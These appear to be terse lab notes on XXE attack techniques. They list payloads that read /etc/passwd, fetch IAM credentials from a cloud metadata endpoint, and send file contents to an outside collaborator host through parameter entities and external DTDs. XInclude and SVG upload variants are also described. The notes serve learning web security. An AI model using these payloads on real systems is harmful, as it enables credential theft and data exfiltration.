Encounter Cliff Notes

- External entity → file read
  - Stock check XML parsed entities. Declared `<!ENTITY xxe SYSTEM "file:///etc/passwd">` and referenced `&xxe;` inside request to read file.

- XXE → SSRF to cloud metadata
  - Pointed entity to `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin` to fetch IAM creds.

- Blind XXE with OOB
  - Referenced collaborator URL in entity to confirm via DNS/HTTP callbacks.

- Entities disabled → parameter entities
  - Switched to `<!ENTITY % xxe SYSTEM "http://<collab>" > %xxe;` so expansion occurs at DTD level.

- Blind XXE exfil via external DTD
  - Hosted DTD that defines `%file` and `%exfil`. Local XML pulled DTD with `%dtd;` then expanded `%exfil;` to send contents off-site.

- Error-based exfil
  - Crafted DTD to embed file contents into a failing URL (`file:///doesnltexist<file>`) so error message included data.

- XInclude file read
  - Injected XInclude element in parsed content to include `file:///etc/passwd` as text.

- SVG upload XXE
  - Uploaded SVG with internal DTD and `<text>&xxe;</text>` to inline local file contents on render.


